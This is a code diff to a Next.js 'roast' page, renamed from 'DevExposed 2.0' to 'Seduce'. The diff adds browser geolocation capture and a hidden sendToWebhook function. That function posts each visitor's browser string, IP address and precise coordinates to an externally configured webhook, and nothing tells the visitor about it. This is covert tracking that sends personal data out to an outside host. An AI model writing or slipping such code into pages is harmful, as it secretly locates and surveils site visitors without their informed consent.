@@ -4,11 +4,12 @@ import { useState, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useRouter } from "next/navigation";
 import Head from "next/head";
-import { Monitor, Globe } from "lucide-react";
+import { Monitor, Globe, MapPin } from "lucide-react"; // Importing MapPin
 
 interface DevInfo {
     browser: string;
     ip: string;
+    coordinates?: { latitude: number; longitude: number };
 }
 
 export default function EnhancedDevExposed() {
@@ -19,6 +20,7 @@ export default function EnhancedDevExposed() {
     const [exposed, setExposed] = useState<boolean>(false);
     const [exposeMessage, setExposeMessage] = useState<string>("");
     const [command, setCommand] = useState<string>("");
+    const [webhookUrl, setWebhookUrl] = useState<string>(process.env.NEXT_PUBLIC_WEBHOOK_URL || "");
 
     const router = useRouter();
 
@@ -43,6 +45,16 @@ export default function EnhancedDevExposed() {
             } catch (error) {
                 console.error("Error fetching IP address:", error);
             }
+
+            navigator.geolocation.getCurrentPosition((position) => {
+                setDevInfo((prev) => ({
+                    ...prev,
+                    coordinates: {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                    },
+                }));
+            });
         };
 
         updateDevInfo();
@@ -61,6 +73,29 @@ export default function EnhancedDevExposed() {
         ];
         const randomLine = randomLines[Math.floor(Math.random() * randomLines.length)];
         setExposeMessage(randomLine);
+
+        // Send the data to the webhook
+        sendToWebhook();
+    };
+
+    const sendToWebhook = async () => {
+        if (!webhookUrl) return;
+
+        try {
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    browser: devInfo.browser,
+                    ip: devInfo.ip,
+                    coordinates: devInfo.coordinates,
+                }),
+            });
+        } catch (error) {
+            console.error("Error sending data to webhook:", error);
+        }
     };
 
     const handleCommandSubmit = (e: React.FormEvent) => {
@@ -79,7 +114,7 @@ export default function EnhancedDevExposed() {
     return (
         <>
             <Head>
-                <title>DevExposed 2.0 - Shrvan Benke</title>
+                <title>Seduce - Shrvan Benke</title>
                 <meta name="description" content="Bro, get ready to be roasted by the code!" />
                 <meta name="viewport" content="width=device-width, initial-scale=1" />
                 <link rel="icon" href="/favicon.ico" />
@@ -92,7 +127,7 @@ export default function EnhancedDevExposed() {
                     className="flex-grow max-w-3xl mx-auto w-full"
                 >
                     <div className="mb-6">
-                        <h1 className="text-4xl font-bold text-[#34495E]">DevExposed 2.0</h1>
+                        <h1 className="text-4xl font-bold text-[#34495E]">Seduce</h1>
                     </div>
                     <div className="bg-[#ECE0C8] text-[#2C3E50] p-6 rounded-lg shadow-md mb-8">
                         <AnimatePresence>
@@ -138,6 +173,11 @@ export default function EnhancedDevExposed() {
                                         <motion.div variants={infoVariants} className="flex items-center">
                                             <Globe className="mr-2" /> Your IP: {devInfo.ip}
                                         </motion.div>
+                                        {devInfo.coordinates && (
+                                            <motion.div variants={infoVariants} className="flex items-center">
+                                                <MapPin className="mr-2" /> Coordinates: {devInfo.coordinates.latitude}, {devInfo.coordinates.longitude}
+                                            </motion.div>
+                                        )}
                                     </motion.div>
                                 </motion.div>
                             )}
